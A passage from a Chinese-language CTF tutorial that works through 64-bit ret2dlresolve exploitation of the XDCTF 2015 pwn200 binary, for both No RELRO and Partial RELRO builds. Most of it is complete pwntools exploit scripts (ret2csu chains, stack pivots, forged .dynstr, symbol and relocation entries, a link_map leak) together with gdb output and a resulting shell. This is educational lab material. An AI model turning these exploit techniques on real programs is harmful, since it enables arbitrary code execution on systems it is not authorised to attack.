io.send(rop.chain())

# construct fake stack
rop = ROP("./main_no_relro_64")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600988+8,8))  # modify .dynstr pointer in .dynamic section to a specific location
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace("read","system")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30,len(dynstr)))  # construct a fake dynstr section
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30+len(dynstr),len("/bin/sh\x00")))  # read /bin/sh\x00
rop.raw(0x0000000000400773) # pop rdi; ret
rop.raw(0x600B30+len(dynstr))
rop.raw(0x400516) # the second instruction of read@plt 
rop.raw(0xdeadbeef)
print(len(rop.chain()))
rop.raw('a'*(stack_size-len(rop.chain())))
io.send(rop.chain())


# reuse the vuln to stack pivot
rop = ROP("./main_no_relro_64")
rop.raw(offset*'a')
rop.migrate(new_stack)
assert(len(rop.chain())<=256)
io.send(rop.chain()+'a'*(256-len(rop.chain())))

# now, we are on the new stack
io.send(p64(0x600B30)) # fake dynstr location
io.send(dynstr) # fake dynstr
io.send("/bin/sh\x00")

io.interactive()
```

此时，我们发现程序又崩了，通过 coredump

```bash
❯ gdb -c core
```

我们发现，在处理 xmm 相关的指令时崩了

```
 ► 0x7fa8677a3396    movaps xmmword ptr [rsp + 0x40], xmm0
   0x7fa8677a339b    call   0x7fa8677931c0 <0x7fa8677931c0>
 
   0x7fa8677a33a0    lea    rsi, [rip + 0x39e259]
   0x7fa8677a33a7    xor    edx, edx
   0x7fa8677a33a9    mov    edi, 3
   0x7fa8677a33ae    call   0x7fa8677931c0 <0x7fa8677931c0>
 
   0x7fa8677a33b3    xor    edx, edx
   0x7fa8677a33b5    mov    rsi, rbp
   0x7fa8677a33b8    mov    edi, 2
   0x7fa8677a33bd    call   0x7fa8677931f0 <0x7fa8677931f0>
 
   0x7fa8677a33c2    mov    rax, qword ptr [rip + 0x39badf]
───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp  0x600d18 ◂— 0x0
01:0008│      0x600d20 —▸ 0x7fa8679080f7 ◂— 0x2f6e69622f00632d /* '-c' */
02:0010│      0x600d28 ◂— 0x0
03:0018│      0x600d30 —▸ 0x40076a ◂— pop    rbx
04:0020│      0x600d38 —▸ 0x7fa8677a3400 ◂— 0x9be1f8b53
05:0028│      0x600d40 —▸ 0x600d34 ◂— 0x677a340000000000
06:0030│      0x600d48 ◂— 0x8000000000000006
07:0038│      0x600d50 ◂— 0x0

```

由于 xmm 相关指令要求地址应该是 16 字节对齐的，而此时 rsp 并不是 16 字节对齐的。因此我们可以简单地调整一下栈，来使得栈是 16 字节对齐的。

```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_no_relro_64")
rop = ROP("./main_no_relro_64")
elf = ELF("./main_no_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400750
csu_end_addr = 0x40076A
leave_ret  =0x40063c
poprbp_ret = 0x400588
def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload

io.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set rsp = new_stack
stack_size = 0x1a0 # new stack size is 0x1a0
new_stack = bss_addr+0x200

offset = 112+8
rop.raw(offset*'a')
payload1 = csu(0, 1 ,elf.got['read'],0,new_stack,stack_size)
rop.raw(payload1)
rop.raw(0x400607)
assert(len(rop.chain())<=256)
rop.raw("a"*(256-len(rop.chain())))
# gdb.attach(io)
io.send(rop.chain())

# construct fake stack
rop = ROP("./main_no_relro_64")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600988+8,8))  # modify .dynstr pointer in .dynamic section to a specific location
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace("read","system")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30,len(dynstr)))  # construct a fake dynstr section
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30+len(dynstr),len("/bin/sh\x00")))  # read /bin/sh\x00
rop.raw(0x0000000000400771) #pop rsi; pop r15; ret; 
rop.raw(0)
rop.raw(0)
rop.raw(0x0000000000400773) # pop rdi; ret
rop.raw(0x600B30+len(dynstr))
rop.raw(0x400516) # the second instruction of read@plt 
rop.raw(0xdeadbeef)
# print(len(rop.chain()))
rop.raw('a'*(stack_size-len(rop.chain())))
io.send(rop.chain())


# reuse the vuln to stack pivot
rop = ROP("./main_no_relro_64")
rop.raw(offset*'a')
rop.migrate(new_stack)
assert(len(rop.chain())<=256)
io.send(rop.chain()+'a'*(256-len(rop.chain())))

# now, we are on the new stack
io.send(p64(0x600B30)) # fake dynstr location
io.send(dynstr) # fake dynstr
io.send("/bin/sh\x00")

io.interactive()
```

最终执行效果如下

```
❯ python exp-no-relro-stack-pivot.py
[+] Starting local process './main_no_relro_64': pid 41149
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './main_no_relro_64'
[*] Switching to interactive mode
$ ls
exp-no-relro-stack-pivot.py  main_no_relro_64
```

到了这里我们发现，与 32 位不同，在 64 位下进行栈迁移然后利用 ret2dlresolve 攻击需要精心构造栈的位置，以避免破坏 .dynamic 节的内容。

这里我们同时给出另外一种方法，即通过多次使用 vuln 函数进行漏洞利用。这种方式看起来会更加清晰一些。

```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_no_relro_64")
elf = ELF("./main_no_relro_64")

bss_addr = elf.bss()
print(hex(bss_addr))
csu_front_addr = 0x400750
csu_end_addr = 0x40076A
leave_ret  =0x40063c
poprbp_ret = 0x400588
def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload

io.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set rsp = new_stack
stack_size = 0x200 # new stack size is 0x200
new_stack = bss_addr+0x100

# modify .dynstr pointer in .dynamic section to a specific location
rop = ROP("./main_no_relro_64")
offset = 112+8
rop.raw(offset*'a')
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600988+8,8))  
rop.raw(0x400607)
rop.raw("a"*(256-len(rop.chain())))
print(rop.dump())
print(len(rop.chain()))
assert(len(rop.chain())<=256)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(p64(0x600B30+0x100))


# construct a fake dynstr section
rop = ROP("./main_no_relro_64")
rop.raw(offset*'a')
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace("read","system")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30+0x100,len(dynstr)))  
rop.raw(0x400607)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(dynstr)

# read /bin/sh\x00
rop = ROP("./main_no_relro_64")
rop.raw(offset*'a')
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30+0x100+len(dynstr),len("/bin/sh\x00")))  
rop.raw(0x400607)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send("/bin/sh\x00")


rop = ROP("./main_no_relro_64")
rop.raw(offset*'a')
rop.raw(0x0000000000400771) #pop rsi; pop r15; ret; 
rop.raw(0)
rop.raw(0)
rop.raw(0x0000000000400773)
rop.raw(0x600B30+0x100+len(dynstr))
rop.raw(0x400516) # the second instruction of read@plt 
rop.raw(0xdeadbeef)
rop.raw('a'*(256-len(rop.chain())))
print(rop.dump())
print(len(rop.chain()))
io.send(rop.chain())
io.interactive()
```

### Partial RELRO

还是利用 2015 年 xdctf 的 pwn200 进行介绍。

```shell
❯ gcc -fno-stack-protector -z relro  -no-pie ../../main.c -o main_partial_relro_64
❯ checksec main_partial_relro_64
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

这里我们仍然以手工构造和基于工具构造两种方式来介绍 64 位下的 ret2dlresolve。

#### 手工伪造

这里我们就不一步步展示了。直接采用最终的思路。

##### 64 位的变化

首先，我们先来看一下 64 位中的一些变化。

glibc 中默认编译使用的是 `ELF_Rela` 来记录重定位项的内容

```c
typedef struct
{
  Elf64_Addr        r_offset;                /* Address */
  Elf64_Xword        r_info;                        /* Relocation type and symbol index */
  Elf64_Sxword        r_addend;                /* Addend */
} Elf64_Rela;
/* How to extract and insert information held in the r_info field.  */
#define ELF64_R_SYM(i)                        ((i) >> 32)
#define ELF64_R_TYPE(i)                        ((i) & 0xffffffff)
#define ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) << 32) + (type))
```

这里 Elf64_Addr、Elf64_Xword、Elf64_Sxword 都为 64 位，因此 Elf64_Rela 结构体的大小为 24 字节。

根据 IDA 里的重定位表的信息可以知道，write 函数在符号表中的偏移为 1（0x100000007h>>32） 。

```assembly
LOAD:0000000000400488 ; ELF JMPREL Relocation Table
LOAD:0000000000400488                 Elf64_Rela <601018h, 100000007h, 0> ; R_X86_64_JUMP_SLOT write
LOAD:00000000004004A0                 Elf64_Rela <601020h, 200000007h, 0> ; R_X86_64_JUMP_SLOT strlen
LOAD:00000000004004B8                 Elf64_Rela <601028h, 300000007h, 0> ; R_X86_64_JUMP_SLOT setbuf
LOAD:00000000004004D0                 Elf64_Rela <601030h, 400000007h, 0> ; R_X86_64_JUMP_SLOT read
LOAD:00000000004004D0 LOAD            ends
```

确实在符号表中的偏移为 1。

```shell
LOAD:00000000004002C0 ; ELF Symbol Table
LOAD:00000000004002C0      Elf64_Sym <0>
LOAD:00000000004002D8      Elf64_Sym <offset aWrite - offset byte_400398, 12h, 0, 0, 0, 0> ; "write"
LOAD:00000000004002F0      Elf64_Sym <offset aStrlen - offset byte_400398, 12h, 0, 0, 0, 0> ; "strlen"
LOAD:0000000000400308      Elf64_Sym <offset aSetbuf - offset byte_400398, 12h, 0, 0, 0, 0> ; "setbuf"
LOAD:0000000000400320      Elf64_Sym <offset aRead - offset byte_400398, 12h, 0, 0, 0, 0> ; "read"
...
```

在 64 位下，Elf64_Sym 结构体为

```c
typedef struct
{
  Elf64_Word        st_name;                /* Symbol name (string tbl index) */
  unsigned char        st_info;                /* Symbol type and binding */
  unsigned char st_other;                /* Symbol visibility */
  Elf64_Section        st_shndx;                /* Section index */
  Elf64_Addr        st_value;                /* Symbol value */
  Elf64_Xword        st_size;                /* Symbol size */
} Elf64_Sym;
```

其中

- Elf64_Word 32 位
- Elf64_Section 16 位
- Elf64_Addr 64 位
- Elf64_Xword 64位

所以，Elf64_Sym 的大小为 24 个字节。

除此之外，在 64 位下，plt 中的代码 push 的是待解析符号在重定位表中的索引，而不是偏移。比如，write 函数 push 的是 0。

```assembly
.plt:0000000000400510 ; ssize_t write(int fd, const void *buf, size_t n)
.plt:0000000000400510 _write          proc near               ; CODE XREF: main+B3↓p
.plt:0000000000400510                 jmp     cs:off_601018
.plt:0000000000400510 _write          endp
.plt:0000000000400510
.plt:0000000000400516 ; ---------------------------------------------------------------------------
.plt:0000000000400516                 push    0
.plt:000000000040051B                 jmp     sub_400500
```

##### First Try - leak

根据上述的分析，我们可以写出如下脚本

```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_partial_relro_64")
elf = ELF("./main_partial_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400780
csu_end_addr = 0x40079A
vuln_addr = 0x400637

def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload


def ret2dlresolve_x64(elf, store_addr, func_name, resolve_addr):
    plt0 = elf.get_section_by_name('.plt').header.sh_addr
    
    rel_plt = elf.get_section_by_name('.rela.plt').header.sh_addr
    relaent = elf.dynamic_value_by_tag("DT_RELAENT") # reloc entry size

    dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
    syment = elf.dynamic_value_by_tag("DT_SYMENT") # symbol entry size

    dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

    # construct fake function string
    func_string_addr = store_addr
    resolve_data = func_name + "\x00"
    
    # construct fake symbol
    symbol_addr = store_addr+len(resolve_data)
    offset = symbol_addr - dynsym
    pad = syment - offset % syment # align syment size
    symbol_addr = symbol_addr+pad
    symbol = p32(func_string_addr-dynstr)+p8(0x12)+p8(0)+p16(0)+p64(0)+p64(0)
    symbol_index = (symbol_addr - dynsym)/24
    resolve_data +='a'*pad
    resolve_data += symbol

    # construct fake reloc 
    reloc_addr = store_addr+len(resolve_data)
    offset = reloc_addr - rel_plt
    pad = relaent - offset % relaent # align relaent size
    reloc_addr +=pad
    reloc_index = (reloc_addr-rel_plt)/24
    rinfo = (symbol_index<<32) | 7
    write_reloc = p64(resolve_addr)+p64(rinfo)+p64(0)
    resolve_data +='a'*pad
    resolve_data +=write_reloc
    
    resolve_call = p64(plt0) + p64(reloc_index)
    return resolve_data, resolve_call
    

io.recvuntil('Welcome to XDCTF2015~!\n')
gdb.attach(io)

store_addr = bss_addr+0x100

# construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location
rop = ROP("./main_partial_relro_64")
offset = 112+8
rop.raw(offset*'a')
resolve_data, resolve_call = ret2dlresolve_x64(elf, store_addr, "system",elf.got["write"])
rop.raw(csu(0, 1 ,elf.got['read'],0,store_addr,len(resolve_data)))  
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
assert(len(rop.chain())<=256)
io.send(rop.chain())
# send resolve data
io.send(resolve_data)

rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
sh = "/bin/sh\x00"
bin_sh_addr = store_addr+len(resolve_data)
rop.raw(csu(0, 1 ,elf.got['read'],0,bin_sh_addr,len(sh)))
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(sh)


rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
rop.raw(0x00000000004007a3) # 0x00000000004007a3: pop rdi; ret; 
rop.raw(bin_sh_addr)
rop.raw(resolve_call)
rop.raw('a'*(256-len(rop.chain())))
io.send(rop.chain())
io.interactive()
```

然而， 简单地运行后发现，程序崩溃了。

```
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
*RAX  0x4003f6 ◂— 0x2000200020000
*RBX  0x601018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x7fe00aa8e250 (write) ◂— lea    rax, [rip + 0x2e06a1]
*RCX  0x155f100000007
*RDX  0x155f1
*RDI  0x400398 ◂— 0x6f732e6362696c00
*RSI  0x601158 ◂— 0x1200200db8
*R8   0x0
 R9   0x7fe00af7a4c0 ◂— 0x7fe00af7a4c0
*R10  0x7fe00af98170 ◂— 0x0
 R11  0x246
*R12  0x6161616161616161 ('aaaaaaaa')
*R13  0x6161616161616161 ('aaaaaaaa')
*R14  0x6161616161616161 ('aaaaaaaa')
*R15  0x6161616161616161 ('aaaaaaaa')
*RBP  0x6161616161616161 ('aaaaaaaa')
*RSP  0x7fffb43c82a0 ◂— 0x0
*RIP  0x7fe00ad7eeb4 (_dl_fixup+116) ◂— movzx  eax, word ptr [rax + rdx*2]
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0x7fe00ad7eeb4 <_dl_fixup+116>    movzx  eax, word ptr [rax + rdx*2]
   0x7fe00ad7eeb8 <_dl_fixup+120>    and    eax, 0x7fff
   0x7fe00ad7eebd <_dl_fixup+125>    lea    rdx, [rax + rax*2]
   0x7fe00ad7eec1 <_dl_fixup+129>    mov    rax, qword ptr [r10 + 0x2e0]
   0x7fe00ad7eec8 <_dl_fixup+136>    lea    r8, [rax + rdx*8]
   0x7fe00ad7eecc <_dl_fixup+140>    mov    eax, 0
   0x7fe00ad7eed1 <_dl_fixup+145>    mov    r9d, dword ptr [r8 + 8]
   0x7fe00ad7eed5 <_dl_fixup+149>    test   r9d, r9d
   0x7fe00ad7eed8 <_dl_fixup+152>    cmove  r8, rax
   0x7fe00ad7eedc <_dl_fixup+156>    mov    edx, dword ptr fs:[0x18]
   0x7fe00ad7eee4 <_dl_fixup+164>    test   edx, edx
```

通过调试，我们发现，程序是在获取对应的版本号

- rax 为 0x4003f6，指向版本号数组
- rdx 为 0x155f1，符号表索引，同时为版本号索引

同时 rax + rdx*2 为 0x42afd8，而这个地址并不在映射的内存中。

```
pwndbg> print /x $rax + $rdx*2
$1 = 0x42afd8
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64
          0x600000           0x601000 r--p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64
          0x601000           0x602000 rw-p     1000 1000   /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64
    0x7fe00a97e000     0x7fe00ab65000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7fe00ab65000     0x7fe00ad65000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7fe00ad65000     0x7fe00ad69000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7fe00ad69000     0x7fe00ad6b000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7fe00ad6b000     0x7fe00ad6f000 rw-p     4000 0      
    0x7fe00ad6f000     0x7fe00ad96000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fe00af79000     0x7fe00af7b000 rw-p     2000 0      
    0x7fe00af96000     0x7fe00af97000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fe00af97000     0x7fe00af98000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fe00af98000     0x7fe00af99000 rw-p     1000 0      
    0x7fffb43a9000     0x7fffb43cb000 rw-p    22000 0      [stack]
    0x7fffb43fb000     0x7fffb43fe000 r--p     3000 0      [vvar]
    0x7fffb43fe000     0x7fffb4400000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
```

那我们能不能想办法让它位于映射的内存中呢。估计有点难

- bss 的起始地址为 0x601050，那么索引值最小为 (0x601050-0x400398)/24=87517，即 0x4003f6 + 87517*2 = 0x42afb0
- bss 可以最大使用的地址为 0x601fff，对应的索引值为(0x601fff-0x400398)/24=87684，即0x4003f6 + 87684*2 = 0x42b0fe

显然都在非映射的内存区域。因此，我们得考虑考虑其它办法。通过阅读 dl_fixup 的代码

```c
        // 获取符号的版本信息
        const struct r_found_version *version = NULL;
        if (l->l_info[VERSYMIDX(DT_VERSYM)] != NULL)
        {
            const ElfW(Half) *vernum = (const void *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);
            ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc->r_info)] & 0x7fff;
            version = &l->l_versions[ndx];
            if (version->hash == 0)
                version = NULL;
        }
```

我们发现，如果把 l->l_info[VERSYMIDX(DT_VERSYM)] 设置为 NULL，那程序就不会执行下面的代码，版本号就为 NULL，就可以正常执行代码。但是，这样的话，我们就需要知道 link_map 的地址了。 GOT 表的第 0 项（本例中 0x601008）存储的就是 link_map 的地址。

因此，我们可以

- 泄露该处的地址
- 将 l->l_info[VERSYMIDX(DT_VERSYM)] 设置为 NULL
- 最后执行利用脚本即可

通过汇编代码，我们可以看出 l->l_info[VERSYMIDX(DT_VERSYM)] 的偏移为 0x1c8

```assembly
 ► 0x7fa4b09f7ea1 <_dl_fixup+97>     mov    rax, qword ptr [r10 + 0x1c8]
   0x7fa4b09f7ea8 <_dl_fixup+104>    xor    r8d, r8d
   0x7fa4b09f7eab <_dl_fixup+107>    test   rax, rax
   0x7fa4b09f7eae <_dl_fixup+110>    je     _dl_fixup+156 <_dl_fixup+156>
```

因此，我们可以简单修改下 exp。

```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_partial_relro_64")
elf = ELF("./main_partial_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400780
csu_end_addr = 0x40079A
vuln_addr = 0x400637

def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload


def ret2dlresolve_x64(elf, store_addr, func_name, resolve_addr):
    plt0 = elf.get_section_by_name('.plt').header.sh_addr
    
    rel_plt = elf.get_section_by_name('.rela.plt').header.sh_addr
    relaent = elf.dynamic_value_by_tag("DT_RELAENT") # reloc entry size

    dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
    syment = elf.dynamic_value_by_tag("DT_SYMENT") # symbol entry size

    dynstr = elf.get_section_by_name('.dynstr').header.sh_addr


    # construct fake function string
    func_string_addr = store_addr
    resolve_data = func_name + "\x00"
    
    # construct fake symbol
    symbol_addr = store_addr+len(resolve_data)
    offset = symbol_addr - dynsym
    pad = syment - offset % syment # align syment size
    symbol_addr = symbol_addr+pad
    symbol = p32(func_string_addr-dynstr)+p8(0x12)+p8(0)+p16(0)+p64(0)+p64(0)
    symbol_index = (symbol_addr - dynsym)/24
    resolve_data +='a'*pad
    resolve_data += symbol

    # construct fake reloc 
    reloc_addr = store_addr+len(resolve_data)
    offset = reloc_addr - rel_plt
    pad = relaent - offset % relaent # align relaent size
    reloc_addr +=pad
    reloc_index = (reloc_addr-rel_plt)/24
    rinfo = (symbol_index<<32) | 7
    write_reloc = p64(resolve_addr)+p64(rinfo)+p64(0)
    resolve_data +='a'*pad
    resolve_data +=write_reloc
    
    resolve_call = p64(plt0) + p64(reloc_index)
    return resolve_data, resolve_call
    

io.recvuntil('Welcome to XDCTF2015~!\n')
gdb.attach(io)

store_addr = bss_addr+0x100

# construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location
rop = ROP("./main_partial_relro_64")
offset = 112+8
rop.raw(offset*'a')
resolve_data, resolve_call = ret2dlresolve_x64(elf, store_addr, "system",elf.got["write"])
rop.raw(csu(0, 1 ,elf.got['read'],0,store_addr,len(resolve_data)))  
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
assert(len(rop.chain())<=256)
io.send(rop.chain())
# send resolve data
io.send(resolve_data)

rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
sh = "/bin/sh\x00"
bin_sh_addr = store_addr+len(resolve_data)
rop.raw(csu(0, 1 ,elf.got['read'],0,bin_sh_addr,len(sh)))
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(sh)


# leak link_map addr
rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
rop.raw(csu(0, 1 ,elf.got['write'],1,0x601008,8))
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
link_map_addr = u64(io.recv(8))
print(hex(link_map_addr))


# set l->l_info[VERSYMIDX(DT_VERSYM)] =  NULL
rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
rop.raw(csu(0, 1 ,elf.got['read'],0,link_map_addr+0x1c8,8))
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(p64(0))


rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
rop.raw(0x00000000004007a3) # 0x00000000004007a3: pop rdi; ret; 
rop.raw(bin_sh_addr)
rop.raw(resolve_call)
# rop.raw('a'*(256-len(rop.chain())))
io.send(rop.chain())
io.interactive()
```

然鹅，还是崩溃。但这次比较好的是，确实已经执行到了 system 函数。通过调试，我们可以发现，system 函数在进一步调用 execve 时出现了问题

```assembly
 ► 0x7f7f3f74d3ec <do_system+1180>       call   execve <execve>
        path: 0x7f7f3f8b20fa ◂— 0x68732f6e69622f /* '/bin/sh' */
        argv: 0x7ffe63677000 —▸ 0x7f7f3f8b20ff ◂— 0x2074697865006873 /* 'sh' */
        envp: 0x7ffe636770a8 ◂— 0x10000
```

即环境变量的地址指向了一个莫名的地址，这应该是我们在进行 ROP 的时候破坏了栈上的数据。那我们可以调整调整，使其为 NULL 或者尽可能不破坏原有的数据。这里我们选择使其为 NULL。

首先，我们可以把读伪造的数据和 /bin/sh 部分的 rop 合并起来，以减少 ROP 的次数

```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_partial_relro_64")
elf = ELF("./main_partial_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400780
csu_end_addr = 0x40079A
vuln_addr = 0x400637

def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload


def ret2dlresolve_x64(elf, store_addr, func_name, resolve_addr):
    plt0 = elf.get_section_by_name('.plt').header.sh_addr
    
    rel_plt = elf.get_section_by_name('.rela.plt').header.sh_addr
    relaent = elf.dynamic_value_by_tag("DT_RELAENT") # reloc entry size

    dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
    syment = elf.dynamic_value_by_tag("DT_SYMENT") # symbol entry size

    dynstr = elf.get_section_by_name('.dynstr').header.sh_addr


    # construct fake function string
    func_string_addr = store_addr
    resolve_data = func_name + "\x00"
    
    # construct fake symbol
    symbol_addr = store_addr+len(resolve_data)
    offset = symbol_addr - dynsym
    pad = syment - offset % syment # align syment size
    symbol_addr = symbol_addr+pad
    symbol = p32(func_string_addr-dynstr)+p8(0x12)+p8(0)+p16(0)+p64(0)+p64(0)
    symbol_index = (symbol_addr - dynsym)/24
    resolve_data +='a'*pad
    resolve_data += symbol

    # construct fake reloc 
    reloc_addr = store_addr+len(resolve_data)
    offset = reloc_addr - rel_plt
    pad = relaent - offset % relaent # align relaent size
    reloc_addr +=pad
    reloc_index = (reloc_addr-rel_plt)/24
    rinfo = (symbol_index<<32) | 7
    write_reloc = p64(resolve_addr)+p64(rinfo)+p64(0)
    resolve_data +='a'*pad
    resolve_data +=write_reloc
    
    resolve_call = p64(plt0) + p64(reloc_index)
    return resolve_data, resolve_call
    

io.recvuntil('Welcome to XDCTF2015~!\n')
gdb.attach(io)

store_addr = bss_addr+0x100
sh = "/bin/sh\x00"

# construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location
rop = ROP("./main_partial_relro_64")
offset = 112+8
rop.raw(offset*'a')
resolve_data, resolve_call = ret2dlresolve_x64(elf, store_addr, "system",elf.got["write"])
rop.raw(csu(0, 1 ,elf.got['read'],0,store_addr,len(resolve_data)+len(sh)))  
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
assert(len(rop.chain())<=256)
io.send(rop.chain())
# send resolve data
io.send(resolve_data+sh)
bin_sh_addr = store_addr+len(resolve_data)


# rop = ROP("./main_partial_relro_64")
# rop.raw(offset*'a')
# sh = "/bin/sh\x00"
# bin_sh_addr = store_addr+len(resolve_data)
# rop.raw(csu(0, 1 ,elf.got['read'],0,bin_sh_addr,len(sh)))
# rop.raw(vuln_addr)
# rop.raw("a"*(256-len(rop.chain())))
# io.send(rop.chain())
# io.send(sh)


# leak link_map addr
rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
rop.raw(csu(0, 1 ,elf.got['write'],1,0x601008,8))
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
link_map_addr = u64(io.recv(8))
print(hex(link_map_addr))


# set l->l_info[VERSYMIDX(DT_VERSYM)] =  NULL
rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
rop.raw(csu(0, 1 ,elf.got['read'],0,link_map_addr+0x1c8,8))
